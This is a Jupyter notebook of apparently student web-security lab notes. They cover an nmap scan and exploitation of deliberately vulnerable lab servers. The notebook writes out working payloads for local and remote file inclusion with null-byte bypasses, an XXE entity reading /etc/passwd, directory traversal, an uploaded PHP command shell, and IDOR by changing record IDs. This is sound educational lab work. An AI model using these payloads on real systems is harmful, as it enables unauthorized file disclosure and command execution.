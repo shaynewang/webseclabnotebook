{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## A0 Lab:\n",
    "**Do the nmap and wfuzz tools get similar results for each site?**\n",
    "No, wfuzz tools printed out the admin, secret, and file directories I created. However, nmap, couldn’t find any directories except for the wordpress server. For the wordpress server, nmaps finds a few files that it interested in and provided it’s guess on what the file could be for.\n",
    "![screenshot](img/screenshot0.png)\n",
    "\n",
    "**Provide screenshots of each tool’s output on the Windows web server VM\n",
    "![screenshot](img/screenshot1.png)\n",
    "\n",
    "## A4 Lab Insecure Direct Object References:\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Starting Nmap 7.40 ( https://nmap.org ) at 2017-10-06 08:39 UTC\n",
      "Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn\n",
      "Nmap done: 1 IP address (0 hosts up) scanned in 3.24 seconds\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "nmap --script http-enum 35.203.179.141"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "### A4/A7\n",
    "#### WFP1: File include\n",
    "##### Example 1\n",
    "(my iso image is mapped to `http://vulnerable/`)\n",
    "LFI: In url go to `http://vulnerable/fileincl/example1.php?page=file:///etc/passwd`, this returns file /etc/passwd from the local machine.\n",
    "\n",
    "![](img/LFI.png)\n",
    "\n",
    "RFI: In url go to `http://vulnerable/fileincl/example1.php?page=http://google.com`, this wraps google front page into my vulnerable website\n",
    "\n",
    "![](img/RFI.png)\n",
    "\n",
    "##### Example 2\n",
    "LFI: In url go to `http://vulnerable/fileincl/example2.php?page=file:///etc/passwd%00`, this returns file /etc/passwd from the local machine. I append the null terminating character to the end of the file I want to access in order to escape the .php extension\n",
    "\n",
    "![](img/LFI.png)\n",
    "\n",
    "RFI: In url go to `http://vulnerable/fileincl/example1.php?page=http://google.com%00`, this wraps google front page into my vulnerable website. I append the null terminating character to the end of the url I want to access in order to escape the .php extension\n",
    "\n",
    "![](img/LFI.png)\n",
    "\n",
    "#### WFP1: XML\n",
    "##### Example 1\n",
    "LFI: Go to `http://vulnerable/xml/example1.php?xml=%3C!DOCTYPE%20mydoc%20[%3C!ENTITY%20x%20SYSTEM%20%22file:///etc/passwd%22%3E]%3E%3Ctest%3E%26x;%3C/test%3E`, this returns the /etc/passwd file on the system. I had to url encode all symbols for this to work.\n",
    "\n",
    "![xml](img/xml_LFI.png)\n",
    "\n",
    "#### WFP1: Directory traversal\n",
    "##### Example 1\n",
    "LFI: Go to `http://vulnerable/dirtrav/example1.php?file=../../../../../../etc/passwd`. use ../../ sequence to get back to the root directory then access the passwd file\n",
    "\n",
    "![Directory traversal](img/dir_trav_1.png)\n",
    "\n",
    "##### Example 2\n",
    "LFI: Go to `http://vulnerable/dirtrav/example2.php?file=/var/www/files/../../../../../../etc/passwd`. use ../../ after `/var/www/files/` to make sure the filter is by passed before traverse back to the root directory.\n",
    "\n",
    "![Directory traversal](img/dir_trav_2.png)\n",
    "\n",
    "##### Example 3\n",
    "LFI: Go to `http://vulnerable/dirtrav/example3.php?file=../../../../../../../../etc/passwd%00`. Similar to Example 1 but I need to add `%00` to terminate the string before the .png extension \n",
    "\n",
    "![Directory traversal](img/dir_trav_3.png)\n",
    "\n",
    "#### WFP1: File upload\n",
    "##### Example 1\n",
    "craft a php file with content of `<?php system('cd / && ls'); ?>`. Then upload the file. Download the result then it contains the directory listing of the root.\n",
    "\n",
    "![dir list](img/file_upload_1_dir_list.png)\n",
    "##### Example 2\n",
    "craft a php file with content of `<?php system('cd / && ls'); ?>` and extensio of .php3. Then upload the file. Download the result then it contains the directory listing of the root.\n",
    "\n",
    "![dir list](img/file_upload_2_dir_list.png)\n",
    "\n",
    "#### WFP2: Authorization\n",
    "##### Example 1\n",
    "(My WFP2 server is at 172.16.230.165)\n",
    "First login with provided username and password. Copy the urls of confidental links then log out and got to`http://172.16.230.165/authorization/example1/infos/1` or `http://172.16.230.165/authorization/example1/infos/2`\n",
    "\n",
    "![authorization](img/authorization_1.png)\n",
    "\n",
    "##### Example 2\n",
    "First login with provided username and password for user 1. Then go to user1's confidental link `http://172.16.230.165/authorization/example2/infos/1`, try to increment the last number and go to `http://172.16.230.165/authorization/example2/infos/3`. I can see user2's confidental content from user1.\n",
    "\n",
    "![authorization](img/authorization_2.png)\n",
    "##### Example 3\n",
    "First login with provided username and password for user 1. Then go to user1's confidental link. Click edit this link. I noticed there is another number to mess with so I changed it to 3. And I got user2's confidental information. `http://172.16.230.165/authorization/example3/infos/edit/3`\n",
    "\n",
    "![authorization](img/authorization_3.png)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.5.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 1
}
